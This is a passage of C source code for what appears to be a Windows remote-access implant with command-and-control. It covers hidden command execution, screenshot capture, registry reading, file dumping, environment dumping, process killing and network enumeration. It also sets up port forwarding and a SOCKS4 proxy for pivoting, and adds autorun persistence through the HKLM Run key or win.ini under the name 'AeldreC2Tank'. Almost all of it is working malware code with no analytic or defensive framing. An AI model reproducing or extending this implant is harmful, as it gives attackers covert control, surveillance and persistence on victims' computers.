    const char *subkey = keypath;
    int i;

    if (!keypath||!keypath[0]) { send_str(s,"regq: no key\r\n"); return send_done(s); }
    hive = NULL;
    for (i=0;i<(int)(sizeof(hives)/sizeof(hives[0]));i++) {
        int n=lstrlen(hives[i].n);
        if (nc_nicmp(keypath,hives[i].n,n)==0) { hive=hives[i].h; subkey=keypath+n; break; }
    }
    if (!hive) { send_str(s,"regq: unknown hive\r\n"); return send_done(s); }

    ret = RegOpenKeyEx(hive,subkey,0,KEY_READ,&hkey);
    if (ret!=ERROR_SUCCESS) {
        wsprintf(line,"regq: cannot open key (%ld)\r\n",ret);
        send_str(s,line); return send_done(s);
    }
    wsprintf(line,"[%s]\r\n",keypath); send_str(s,line);
    for (idx=0;;idx++) {
        DWORD vsz=sizeof(vname),dsz=sizeof(vdata),vtype;
        ret=RegEnumValue(hkey,idx,vname,&vsz,NULL,&vtype,vdata,&dsz);
        if (ret==ERROR_NO_MORE_ITEMS||ret!=ERROR_SUCCESS) break;
        switch(vtype) {
        case REG_SZ: case REG_EXPAND_SZ:
            wsprintf(line,"  \"%s\" = \"%s\"\r\n",vname[0]?vname:"(Default)",(char*)vdata); break;
        case REG_DWORD:
            wsprintf(line,"  \"%s\" = dword:%08lX\r\n",vname[0]?vname:"(Default)",*(DWORD*)vdata); break;
        default:
            wsprintf(line,"  \"%s\" = type%lu[%lu bytes]\r\n",vname[0]?vname:"(Default)",vtype,dsz); break;
        }
        send_str(s,line);
    }
    RegCloseKey(hkey);
    return send_done(s);
}

static int cmd_screenshot(SOCKET s)
{
    int   w, h;
    HDC   hdcScr, hdcMem;
    HBITMAP hBmp;
    BITMAPINFO bmi;
    BITMAPFILEHEADER bfh;
    DWORD pixel_bytes, total;
    char  *pixels;
    char  header[64];

    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    hdcScr = GetDC(NULL);
    hdcMem = CreateCompatibleDC(hdcScr);
    hBmp   = CreateCompatibleBitmap(hdcScr, w, h);
    SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, w, h, hdcScr, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hdcScr);

    memset(&bmi, 0, sizeof(bmi));
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth       = w;
    bmi.bmiHeader.biHeight      = -h;   /* top-down */
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    pixel_bytes = (DWORD)(((w * 3 + 3) & ~3) * h);
    total       = sizeof(bfh) + sizeof(BITMAPINFOHEADER) + pixel_bytes;

    pixels = (char *)GlobalAlloc(GMEM_FIXED, pixel_bytes);
    if (!pixels) {
        DeleteObject(hBmp); DeleteDC(hdcMem);
        send_str(s,"screenshot: out of memory\r\n"); return send_done(s);
    }

    GetDIBits(hdcMem, hBmp, 0, h, pixels, &bmi, DIB_RGB_COLORS);
    DeleteObject(hBmp); DeleteDC(hdcMem);

    wsprintf(header, "FILE:%lu\n", total);
    send_str(s, header);

    memset(&bfh,0,sizeof(bfh));
    bfh.bfType    = 0x4D42;
    bfh.bfSize    = total;
    bfh.bfOffBits = sizeof(bfh)+sizeof(BITMAPINFOHEADER);
    send_all(s,(char*)&bfh,sizeof(bfh));
    send_all(s,(char*)&bmi.bmiHeader,sizeof(BITMAPINFOHEADER));
    send_all(s,pixels,(int)pixel_bytes);
    GlobalFree(pixels);
    return send_done(s);
}

static int exec_command(SOCKET s, const char *cmd, const char *shell)
{
    SECURITY_ATTRIBUTES sa;
    STARTUPINFO         si;
    PROCESS_INFORMATION pi;
    HANDLE  hRead=INVALID_HANDLE_VALUE, hWrite=INVALID_HANDLE_VALUE;
    char    cmdline[CMD_BUFSZ+MAX_PATH+8];
    char    *outbuf; DWORD nread; int rc=0;

    outbuf=(char*)GlobalAlloc(GMEM_FIXED,OUT_BUFSZ);
    if(!outbuf){send_str(s,"tank: oom\r\n");return send_done(s);}
    memset(&sa,0,sizeof(sa)); sa.nLength=sizeof(sa); sa.bInheritHandle=TRUE;
    if(!CreatePipe(&hRead,&hWrite,&sa,0)){
        wsprintf(outbuf,"tank: pipe failed (%lu)\r\n",GetLastError());
        send_str(s,outbuf); GlobalFree(outbuf); return send_done(s);
    }
    wsprintf(cmdline,"%s /c %s",shell,cmd);
    memset(&si,0,sizeof(si)); si.cb=sizeof(si);
    si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    si.hStdInput=GetStdHandle(STD_INPUT_HANDLE); si.hStdOutput=hWrite; si.hStdError=hWrite;
    memset(&pi,0,sizeof(pi));
    if(!CreateProcess(NULL,cmdline,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
        wsprintf(outbuf,"tank: exec failed (%lu)\r\n",GetLastError());
        send_str(s,outbuf); CloseHandle(hRead); CloseHandle(hWrite);
        GlobalFree(outbuf); return send_done(s);
    }
    CloseHandle(hWrite); CloseHandle(pi.hThread);
    while(ReadFile(hRead,outbuf,OUT_BUFSZ,&nread,NULL)&&nread>0)
        if(send_all(s,outbuf,(int)nread)<0){rc=-1;break;}
    WaitForSingleObject(pi.hProcess,60000UL);
    CloseHandle(pi.hProcess); CloseHandle(hRead); GlobalFree(outbuf);
    if(rc==0) rc=send_done(s);
    return rc;
}

/* -----------------------------------------------------------------------
 * Portfwd: bidirectional relay between two sockets (runs in thread)
 * ----------------------------------------------------------------------- */
typedef struct { SOCKET a; SOCKET b; } RelayCTX;

static DWORD WINAPI relay_thread(LPVOID arg)
{
    RelayCTX *ctx = (RelayCTX *)arg;
    SOCKET a = ctx->a, b = ctx->b;
    char buf[4096];
    free(ctx);

    for (;;) {
        fd_set rset; struct timeval tv;
        int n;
        FD_ZERO(&rset); FD_SET(a, &rset); FD_SET(b, &rset);
        tv.tv_sec = 0; tv.tv_usec = 20000;
        if (select(0, &rset, NULL, NULL, &tv) <= 0) continue;
        if (FD_ISSET(a, &rset)) {
            n = recv(a, buf, sizeof(buf), 0); if (n <= 0) break;
            if (send(b, buf, n, 0) == SOCKET_ERROR) break;
        }
        if (FD_ISSET(b, &rset)) {
            n = recv(b, buf, sizeof(buf), 0); if (n <= 0) break;
            if (send(a, buf, n, 0) == SOCKET_ERROR) break;
        }
    }
    closesocket(a); closesocket(b);
    return 0;
}

/* Accept loop for portfwd (runs in thread) */
static DWORD WINAPI portfwd_accept_thread(LPVOID arg)
{
    RelaySlot *slot = (RelaySlot *)arg;
    SOCKET cs;

    while (slot->active) {
        struct sockaddr_in peer; int plen = sizeof(peer);
        cs = accept(slot->listen_sock, (struct sockaddr *)&peer, &plen);
        if (cs == INVALID_SOCKET) break;
        {
            /* Connect to remote target */
            SOCKET rs;
            struct sockaddr_in raddr;
            struct hostent *he;
            char info[256];

            rs = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (rs == INVALID_SOCKET) { closesocket(cs); continue; }

            memset(&raddr, 0, sizeof(raddr));
            raddr.sin_family = AF_INET;
            raddr.sin_port   = htons((unsigned short)slot->rport);
            {
                unsigned long ip = inet_addr(slot->rhost);
                if (ip != INADDR_NONE) raddr.sin_addr.s_addr = ip;
                else {
                    he = gethostbyname(slot->rhost);
                    if (!he) { closesocket(cs); closesocket(rs); continue; }
                    memcpy(&raddr.sin_addr, he->h_addr, 4);
                }
            }
            if (connect(rs, (struct sockaddr *)&raddr, sizeof(raddr)) != 0) {
                closesocket(cs); closesocket(rs); continue;
            }

            /* Report new tunnel to Joshua */
            if (slot->c2_sock != INVALID_SOCKET) {
                wsprintf(info, "RELAY %d:%d CONNECT %s:%s:%d\r\n",
                         slot->lport,
                         (int)peer.sin_port,
                         inet_ntoa(peer.sin_addr),
                         slot->rhost, slot->rport);
                send(slot->c2_sock, info, lstrlen(info), 0);
            }

            /* Spawn relay thread */
            {
                RelayCTX *ctx = (RelayCTX *)malloc(sizeof(RelayCTX));
                if (ctx) {
                    HANDLE t;
                    ctx->a = cs; ctx->b = rs;
                    t = CreateThread(NULL, 0, relay_thread, ctx, 0, NULL);
                    if (t) CloseHandle(t);
                    else { free(ctx); closesocket(cs); closesocket(rs); }
                } else { closesocket(cs); closesocket(rs); }
            }
        }
    }
    closesocket(slot->listen_sock);
    slot->listen_sock = INVALID_SOCKET;
    slot->active = 0;
    return 0;
}

/* cmd_portfwd: portfwd <lport> <rhost> <rport> */
static int cmd_portfwd(SOCKET s, const char *args)
{
    int lport, rport, i;
    char rhost[256];
    RelaySlot *slot = NULL;
    SOCKET ls;
    struct sockaddr_in addr;
    char info[256];

    if (sscanf(args, "%d %255s %d", &lport, rhost, &rport) != 3) {
        send_str(s, "portfwd: usage: portfwd <lport> <rhost> <rport>\r\n");
        return send_done(s);
    }
    if (lport < 1 || lport > 65535 || rport < 1 || rport > 65535) {
        send_str(s, "portfwd: invalid port\r\n"); return send_done(s);
    }

    for (i = 0; i < MAX_RELAYS; i++) {
        if (!g_relays[i].active) { slot = &g_relays[i]; break; }
    }
    if (!slot) { send_str(s, "portfwd: too many active relays\r\n"); return send_done(s); }

    ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ls == INVALID_SOCKET) { send_str(s, "portfwd: socket failed\r\n"); return send_done(s); }
    { int r = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, (char *)&r, sizeof(r)); }
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET; addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons((unsigned short)lport);
    if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) != 0 || listen(ls, 8) != 0) {
        closesocket(ls);
        send_str(s, "portfwd: bind/listen failed\r\n"); return send_done(s);
    }

    memset(slot, 0, sizeof(*slot));
    slot->type = 1; slot->active = 1;
    slot->lport = lport; slot->rport = rport;
    lstrcpyn(slot->rhost, rhost, sizeof(slot->rhost));
    slot->listen_sock = ls;
    slot->c2_sock = s;

    slot->thread = CreateThread(NULL, 0, portfwd_accept_thread, slot, 0, NULL);
    if (!slot->thread) {
        closesocket(ls); slot->active = 0;
        send_str(s, "portfwd: CreateThread failed\r\n"); return send_done(s);
    }
    CloseHandle(slot->thread);

    wsprintf(info, "portfwd: listening on :%d -> %s:%d\r\n", lport, rhost, rport);
    send_str(s, info);
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * SOCKS4: minimal server (runs in thread per connection)
 * ----------------------------------------------------------------------- */

typedef struct { SOCKET client; SOCKET c2; } Socks4CTX;

#pragma pack(1)
typedef struct { BYTE vn; BYTE cd; WORD dstport; DWORD dstip; } Socks4Req;
#pragma pack()

static DWORD WINAPI socks4_conn_thread(LPVOID arg)
{
    Socks4CTX *ctx = (Socks4CTX *)arg;
    SOCKET cs = ctx->client;
    SOCKET rs;
    Socks4Req req;
    struct sockaddr_in dst;
    BYTE  reply[8];
    char  userid[256];
    int   n, uid_len = 0;
    char  c;
    free(ctx);

    /* Read SOCKS4 request header */
    n = recv(cs, (char *)&req, sizeof(req), MSG_WAITALL);
    if (n != sizeof(req)) goto fail;

    /* Read NUL-terminated user ID */
    while (uid_len < 255) {
        if (recv(cs, &c, 1, 0) != 1) goto fail;
        if (c == '\0') break;
        userid[uid_len++] = c;
    }
    userid[uid_len] = '\0';

    if (req.vn != 4 || req.cd != 1) goto fail;

    /* Connect to requested destination */
    rs = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (rs == INVALID_SOCKET) goto fail;

    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port   = req.dstport;           /* already network byte order */
    dst.sin_addr.s_addr = req.dstip;

    if (connect(rs, (struct sockaddr *)&dst, sizeof(dst)) != 0) {
        /* Request rejected */
        memset(reply, 0, 8); reply[1] = 91;  /* request rejected */
        send(cs, (char *)reply, 8, 0);
        closesocket(rs); closesocket(cs); return 0;
    }

    /* Request granted */
    memset(reply, 0, 8); reply[1] = 90;
    send(cs, (char *)reply, 8, 0);

    /* Relay */
    {
        RelayCTX *rc = (RelayCTX *)malloc(sizeof(RelayCTX));
        if (rc) {
            HANDLE t;
            rc->a = cs; rc->b = rs;
            t = CreateThread(NULL, 0, relay_thread, rc, 0, NULL);
            if (t) { CloseHandle(t); return 0; }
            free(rc);
        }
    }
    closesocket(rs);
fail:
    closesocket(cs);
    return 0;
}

/* Accept loop for SOCKS4 (runs in thread) */
static DWORD WINAPI socks4_accept_thread(LPVOID arg)
{
    RelaySlot *slot = (RelaySlot *)arg;
    SOCKET cs;

    while (slot->active) {
        struct sockaddr_in peer; int plen = sizeof(peer);
        cs = accept(slot->listen_sock, (struct sockaddr *)&peer, &plen);
        if (cs == INVALID_SOCKET) break;
        {
            Socks4CTX *ctx = (Socks4CTX *)malloc(sizeof(Socks4CTX));
            if (ctx) {
                HANDLE t;
                ctx->client = cs; ctx->c2 = slot->c2_sock;
                t = CreateThread(NULL, 0, socks4_conn_thread, ctx, 0, NULL);
                if (t) CloseHandle(t);
                else { free(ctx); closesocket(cs); }
            } else { closesocket(cs); }
        }
    }
    closesocket(slot->listen_sock);
    slot->listen_sock = INVALID_SOCKET;
    slot->active = 0;
    return 0;
}

static int cmd_socks4(SOCKET s, const char *args)
{
    int lport, i;
    RelaySlot *slot = NULL;
    SOCKET ls;
    struct sockaddr_in addr;
    char info[128];

    lport = atoi(args);
    if (lport < 1 || lport > 65535) {
        send_str(s, "socks4: usage: socks4 <lport>\r\n"); return send_done(s);
    }

    for (i = 0; i < MAX_RELAYS; i++) {
        if (!g_relays[i].active) { slot = &g_relays[i]; break; }
    }
    if (!slot) { send_str(s, "socks4: too many active relays\r\n"); return send_done(s); }

    ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ls == INVALID_SOCKET) { send_str(s, "socks4: socket failed\r\n"); return send_done(s); }
    { int r = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, (char *)&r, sizeof(r)); }
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET; addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons((unsigned short)lport);
    if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) != 0 || listen(ls, 16) != 0) {
        closesocket(ls); send_str(s, "socks4: bind/listen failed\r\n"); return send_done(s);
    }

    memset(slot, 0, sizeof(*slot));
    slot->type = 2; slot->active = 1;
    slot->lport = lport; slot->listen_sock = ls; slot->c2_sock = s;

    slot->thread = CreateThread(NULL, 0, socks4_accept_thread, slot, 0, NULL);
    if (!slot->thread) {
        closesocket(ls); slot->active = 0;
        send_str(s, "socks4: CreateThread failed\r\n"); return send_done(s);
    }
    CloseHandle(slot->thread);

    wsprintf(info, "socks4: proxy listening on :%d\r\n", lport);
    send_str(s, info);
    return send_done(s);
}

/* stop all relays */
static int cmd_relay_stop(SOCKET s, const char *args)
{
    int i, stopped = 0;
    char info[128];
    (void)args;
    for (i = 0; i < MAX_RELAYS; i++) {
        if (g_relays[i].active) {
            g_relays[i].active = 0;
            if (g_relays[i].listen_sock != INVALID_SOCKET) {
                closesocket(g_relays[i].listen_sock);
                g_relays[i].listen_sock = INVALID_SOCKET;
            }
            stopped++;
        }
    }
    wsprintf(info, "relay: stopped %d relay(s)\r\n", stopped);
    send_str(s, info);
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * cwd / cd / cat / less
 * ----------------------------------------------------------------------- */
static int cmd_cwd(SOCKET s)
{
    char buf[MAX_PATH + 4];
    GetCurrentDirectory(MAX_PATH, buf);
    lstrcat(buf, "\r\n");
    send_str(s, buf);
    return send_done(s);
}

static int cmd_cd(SOCKET s, const char *path)
{
    char msg[MAX_PATH + 40];
    if (!path || !path[0]) return cmd_cwd(s);
    if (!SetCurrentDirectory(path)) {
        wsprintf(msg, "cd: cannot change to '%s' (%lu)\r\n", path, GetLastError());
        send_str(s, msg); return send_done(s);
    }
    return cmd_cwd(s);  /* confirm new directory */
}

#define CAT_MAX_BINARY_CHECK 512

static int cmd_cat(SOCKET s, const char *path)
{
    FILE *f;
    char  buf[4096];
    int   n;

    if (!path || !path[0]) { send_str(s, "cat: no path\r\n"); return send_done(s); }
    f = fopen(path, "rb");
    if (!f) { char m[MAX_PATH+32]; wsprintf(m,"cat: cannot open '%s' (%lu)\r\n",path,GetLastError()); send_str(s,m); return send_done(s); }

    /* Quick binary check on first 512 bytes */
    { int probe = (int)fread(buf, 1, CAT_MAX_BINARY_CHECK, f);
      int bi, is_bin = 0;
      for (bi = 0; bi < probe; bi++) {
          unsigned char c = (unsigned char)buf[bi];
          if (c < 8 || (c > 13 && c < 32 && c != 27)) { is_bin = 1; break; }
      }
      if (is_bin) {
          send_str(s, "cat: file appears binary — use 'get' to download\r\n");
          fclose(f); return send_done(s);
      }
      if (probe > 0) send_all(s, buf, probe); }

    while ((n = (int)fread(buf, 1, sizeof(buf), f)) > 0)
        send_all(s, buf, n);
    fclose(f);
    if (buf[0] != '\n') send_str(s, "\r\n");
    return send_done(s);
}

/* less: paged display — protocol uses <<<PAGE>>> marker */
#define LESS_PAGE 40   /* lines per page */

static int cmd_less(SOCKET s, const char *path)
{
    FILE *f;
    char  line[1024];
    char  cmd[64];
    int   line_count = 0;

    if (!path || !path[0]) { send_str(s, "less: no path\r\n"); return send_done(s); }
    f = fopen(path, "r");
    if (!f) { char m[MAX_PATH+32]; wsprintf(m,"less: cannot open '%s' (%lu)\r\n",path,GetLastError()); send_str(s,m); return send_done(s); }

    while (fgets(line, sizeof(line), f)) {
        send_str(s, line);
        line_count++;
        if (line_count >= LESS_PAGE) {
            send_str(s, "<<<PAGE>>>\r\n");
            line_count = 0;
            {
                int n = recv_line(s, cmd, sizeof(cmd));
                if (n < 0) goto done;
                if (nc_nicmp(cmd, "QUITPAGE", 8) == 0) goto done;
                /* NEXTPAGE: continue */
            }
        }
    }
done:
    fclose(f);
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * persist: add this implant to the platform's autostart mechanism
 * ----------------------------------------------------------------------- */
static int cmd_persist(SOCKET s, const char *args)
{
    char   self_path[MAX_PATH];
    char   msg[MAX_PATH + 80];
    BOOL   remove_mode = (args && nc_nicmp(args, "remove", 6) == 0);
    LONG   ret;
    HKEY   hkey;
    BOOL   is_nt;
    const char *value_name = "AeldreC2Tank";

    GetModuleFileName(NULL, self_path, MAX_PATH);

    {   OSVERSIONINFO osv; memset(&osv,0,sizeof(osv));
        osv.dwOSVersionInfoSize=sizeof(osv); GetVersionEx(&osv);
        is_nt = (osv.dwPlatformId == VER_PLATFORM_WIN32_NT); }

    if (is_nt || GetVersion() < 0x80000000UL) {
        /* NT or Win95/98: use HKLM\...\Run */
        const char *regpath = is_nt
            ? "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Run"
            : "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

        if (remove_mode) {
            ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, regpath, 0, KEY_SET_VALUE, &hkey);
            if (ret == ERROR_SUCCESS) { RegDeleteValue(hkey, value_name); RegCloseKey(hkey); }
            send_str(s, "persist: autorun entry removed\r\n");
        } else {
            ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, regpath, 0, NULL, 0,
                                 KEY_SET_VALUE, NULL, &hkey, NULL);
            if (ret == ERROR_SUCCESS) {
                RegSetValueEx(hkey, value_name, 0, REG_SZ,
                              (BYTE *)self_path, (DWORD)lstrlen(self_path)+1);
                RegCloseKey(hkey);
                wsprintf(msg, "persist: added to %s\\%s\r\n", regpath, value_name);
                send_str(s, msg);
            } else {
                wsprintf(msg, "persist: RegCreateKeyEx failed (%ld) — try as admin\r\n", ret);
                send_str(s, msg);
            }
        }
    } else {
        /* WFW / Win 3.11: use win.ini [windows] load= */
        if (remove_mode) {
            char existing[2048] = "", newval[2048] = "", *p;
            GetProfileString("windows", "load", "", existing, sizeof(existing));
            p = existing;
            while (*p) {
                char *start = p;
                while (*p && *p != ' ') p++;
                if (*p) *p++ = '\0';
                if (lstrcmpi(start, self_path) != 0) {
                    if (newval[0]) lstrcat(newval, " ");
                    lstrcat(newval, start);
                }
            }
            WriteProfileString("windows", "load", newval);
            send_str(s, "persist: removed from win.ini [windows] load=\r\n");
        } else {
            char existing[2048] = "", newval[2048];
            GetProfileString("windows", "load", "", existing, sizeof(existing));
            if (existing[0]) wsprintf(newval, "%s %s", existing, self_path);
            else             lstrcpyn(newval, self_path, sizeof(newval)-1);
            WriteProfileString("windows", "load", newval);
            send_str(s, "persist: added to win.ini [windows] load=\r\n");
        }
    }

    wsprintf(msg, "persist: path = %s\r\n", self_path);
    send_str(s, msg);
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * cmd_env — list all environment variables
 * ----------------------------------------------------------------------- */
static int cmd_env(SOCKET s)
{
    char *env = GetEnvironmentStrings();
    char *p;
    if (!env) { send_str(s,"env: GetEnvironmentStrings failed\r\n"); return send_done(s); }
    for (p = env; *p; ) {
        int n = lstrlen(p);
        send_str(s, p); send_str(s, "\r\n");
        p += n + 1;
    }
    FreeEnvironmentStrings(env);
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * cmd_kill — terminate a process by PID
 * ----------------------------------------------------------------------- */
static int cmd_kill(SOCKET s, const char *arg)
{
    DWORD  pid;
    HANDLE h;
    char   line[80];
    if (!arg||!arg[0]) { send_str(s,"kill: usage: kill <pid>\r\n"); return send_done(s); }
    pid = (DWORD)atol(arg);
    h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) {
        wsprintf(line,"kill: OpenProcess(%lu) failed (%lu)\r\n",pid,GetLastError());
        send_str(s,line); return send_done(s);
    }
    if (!TerminateProcess(h,1)) {
        wsprintf(line,"kill: TerminateProcess(%lu) failed (%lu)\r\n",pid,GetLastError());
        CloseHandle(h); send_str(s,line); return send_done(s);
    }
    CloseHandle(h);
    wsprintf(line,"kill: pid %lu terminated\r\n",pid);
    send_str(s,line);
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * cmd_pinfo — detailed info for one process (ToolHelp32)
 * ----------------------------------------------------------------------- */
static int cmd_pinfo(SOCKET s, const char *arg)
{
    HMODULE  hK = GetModuleHandle("kernel32.dll");
    PFN_CTS  fCTS  = hK ? (PFN_CTS) GetProcAddress(hK,"CreateToolhelp32Snapshot") : NULL;
    PFN_P32F fP32F = hK ? (PFN_P32F)GetProcAddress(hK,"Process32First") : NULL;
    PFN_P32N fP32N = hK ? (PFN_P32N)GetProcAddress(hK,"Process32Next")  : NULL;
    HANDLE   snap;
    TC_PE32  pe;
    DWORD    pid;
    char     line[MAX_PATH+128];
    int      found = 0;

    if (!arg||!arg[0]) { send_str(s,"pinfo: usage: pinfo <pid>\r\n"); return send_done(s); }
    pid = (DWORD)atol(arg);
    if (!fCTS||!fP32F||!fP32N) { send_str(s,"pinfo: ToolHelp32 not available\r\n"); return send_done(s); }
    snap = fCTS(TC_TH32CS_SNAPPROCESS,0);
    if (snap==INVALID_HANDLE_VALUE) { send_str(s,"pinfo: snapshot failed\r\n"); return send_done(s); }
    pe.dwSize = sizeof(pe);
    if (fP32F(snap,&pe)) do {
        if (pe.th32ProcessID==pid) {
            wsprintf(line,"PID:     %lu\r\nParent:  %lu\r\nThreads: %lu\r\nName:    %s\r\n",
                     pe.th32ProcessID,pe.th32ParentProcessID,pe.cntThreads,pe.szExeFile);
            send_str(s,line); found=1; break;
        }
    } while (fP32N(snap,&pe));
    CloseHandle(snap);
    if (!found) { wsprintf(line,"pinfo: pid %lu not found\r\n",pid); send_str(s,line); }
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * cmd_resolve — DNS forward / reverse lookup
 * ----------------------------------------------------------------------- */
static int cmd_resolve(SOCKET s, const char *arg)
{
    struct hostent *he;
    struct in_addr  ia;
    char   line[256];
    int    i;

    if (!arg||!arg[0]) { send_str(s,"resolve: usage: resolve <host>\r\n"); return send_done(s); }
    he = gethostbyname(arg);
    if (!he) {
        wsprintf(line,"resolve: %s: not found (WSA %d)\r\n",arg,WSAGetLastError());
        send_str(s,line); return send_done(s);
    }
    wsprintf(line,"Name: %s\r\n",he->h_name); send_str(s,line);
    for (i=0; he->h_aliases&&he->h_aliases[i]; i++) {
        wsprintf(line,"      %s\r\n",he->h_aliases[i]); send_str(s,line);
    }
    for (i=0; he->h_addr_list[i]; i++) {
        memcpy(&ia,he->h_addr_list[i],sizeof(ia));
        wsprintf(line,"  %s\r\n",inet_ntoa(ia)); send_str(s,line);
    }
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * cmd_ifconfig — list network adapters via iphlpapi (NT4+ / Win98+)
 * ----------------------------------------------------------------------- */
static int cmd_ifconfig(SOCKET s)
{
    HMODULE hIP = LoadLibrary("iphlpapi.dll");
    pfGetAdaptersInfo fGetAI = hIP ? (pfGetAdaptersInfo)GetProcAddress(hIP,"GetAdaptersInfo") : NULL;
    IPHLP_ADAPTER_INFO *info;
    IPHLP_ADAPTER_INFO *p;
    ULONG  sz;
    char   line[512];
    int    i;

    if (!fGetAI) {
        if (hIP) FreeLibrary(hIP);
        send_str(s,"ifconfig: iphlpapi not available (NT<4)\r\n");
        return send_done(s);
    }
    sz   = 16384;
    info = (IPHLP_ADAPTER_INFO *)GlobalAlloc(GMEM_FIXED, sz);
    if (!info) { FreeLibrary(hIP); return send_done(s); }
    if (fGetAI(info,&sz) != 0) {
        GlobalFree(info); FreeLibrary(hIP);
        send_str(s,"ifconfig: GetAdaptersInfo failed\r\n");
        return send_done(s);
    }
    for (p=info; p; p=p->Next) {
        IPHLP_IP_ADDR_STR *ip;
        const char *atype;
        char mac[28]; char *mp = mac;
        *mp = '\0';
        switch(p->Type){
        case  6: atype="Ethernet"; break;
        case 23: atype="PPP";      break;
        case 24: atype="Loopback"; break;
        case 28: atype="SLIP";     break;
        default: atype="Other";    break;
        }
        wsprintf(line,"%-4lu  %-30s  %s\r\n",
                 p->Index, p->Description[0]?p->Description:p->AdapterName, atype);
        send_str(s,line);
        if (p->AddressLength > 0) {
            for (i=0; i<(int)p->AddressLength&&i<8; i++) {
                if (i) *mp++='-';
                *mp++="0123456789ABCDEF"[p->Address[i]>>4];
                *mp++="0123456789ABCDEF"[p->Address[i]&0xF];
            }
            *mp='\0';
            wsprintf(line,"      MAC: %s\r\n",mac); send_str(s,line);
        }
        for (ip=&p->IpAddressList; ip; ip=ip->Next) {
            if (!ip->IpAddress[0]||lstrcmp(ip->IpAddress,"0.0.0.0")==0) continue;
            wsprintf(line,"      inet %s  mask %s  %s\r\n",
                     ip->IpAddress,ip->IpMask,p->DhcpEnabled?"DHCP":"static");
            send_str(s,line);
        }
        if (p->GatewayList.IpAddress[0]&&lstrcmp(p->GatewayList.IpAddress,"0.0.0.0")!=0) {
            wsprintf(line,"      gw   %s\r\n",p->GatewayList.IpAddress); send_str(s,line);
        }
        send_str(s,"\r\n");
    }
    GlobalFree(info); FreeLibrary(hIP);
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * cmd_netstat — active TCP/UDP connections via iphlpapi (NT4+ / Win98+)
 * ----------------------------------------------------------------------- */
static const char *tcp_state_name(DWORD st) {
    switch(st) {
    case  1: return "CLOSED";      case  2: return "LISTEN";
    case  3: return "SYN_SENT";    case  4: return "SYN_RCVD";
    case  5: return "ESTABLISHED"; case  6: return "FIN_WAIT1";
    case  7: return "FIN_WAIT2";   case  8: return "CLOSE_WAIT";
    case  9: return "CLOSING";     case 10: return "LAST_ACK";
    case 11: return "TIME_WAIT";   case 12: return "DELETE_TCB";
    default: return "UNKNOWN";
    }
}

static int cmd_netstat(SOCKET s)
{
    HMODULE hIP = LoadLibrary("iphlpapi.dll");
    pfGetTcpTable fGetTCP = hIP ? (pfGetTcpTable)GetProcAddress(hIP,"GetTcpTable") : NULL;
    pfGetUdpTable fGetUDP = hIP ? (pfGetUdpTable)GetProcAddress(hIP,"GetUdpTable") : NULL;
    char  *buf;
    DWORD  sz;
    char   line[128];
    DWORD  i;

    if (!fGetTCP||!fGetUDP) {
        if (hIP) FreeLibrary(hIP);
        send_str(s,"netstat: iphlpapi not available (NT<4)\r\n");
        return send_done(s);
    }
    send_str(s,"Proto  Local                  Remote                 State\r\n");

    sz=8192; buf=(char *)GlobalAlloc(GMEM_FIXED,sz);
    if (buf&&fGetTCP(buf,&sz,TRUE)==0) {
        IPHLP_TCPTABLE *t=(IPHLP_TCPTABLE *)buf;
        for (i=0; i<t->dwNumEntries; i++) {
            struct in_addr la,ra; char ls[24],rs[24];
            la.s_addr=t->table[i].dwLocalAddr;
            ra.s_addr=t->table[i].dwRemoteAddr;
            wsprintf(ls,"%s:%u",inet_ntoa(la),ntohs((WORD)t->table[i].dwLocalPort));
            wsprintf(rs,"%s:%u",inet_ntoa(ra),ntohs((WORD)t->table[i].dwRemotePort));
            wsprintf(line,"TCP    %-22s %-22s %s\r\n",ls,rs,tcp_state_name(t->table[i].dwState));
            send_str(s,line);
        }
    }
    if (buf) GlobalFree(buf);

    sz=8192; buf=(char *)GlobalAlloc(GMEM_FIXED,sz);
    if (buf&&fGetUDP(buf,&sz,TRUE)==0) {
        IPHLP_UDPTABLE *t=(IPHLP_UDPTABLE *)buf;
        for (i=0; i<t->dwNumEntries; i++) {
            struct in_addr la; char ls[24];
            la.s_addr=t->table[i].dwLocalAddr;
            wsprintf(ls,"%s:%u",inet_ntoa(la),ntohs((WORD)t->table[i].dwLocalPort));
            wsprintf(line,"UDP    %-22s *:*\r\n",ls);
            send_str(s,line);
        }
    }
    if (buf) GlobalFree(buf);
    if (hIP) FreeLibrary(hIP);
    return send_done(s);
}

/* -----------------------------------------------------------------------
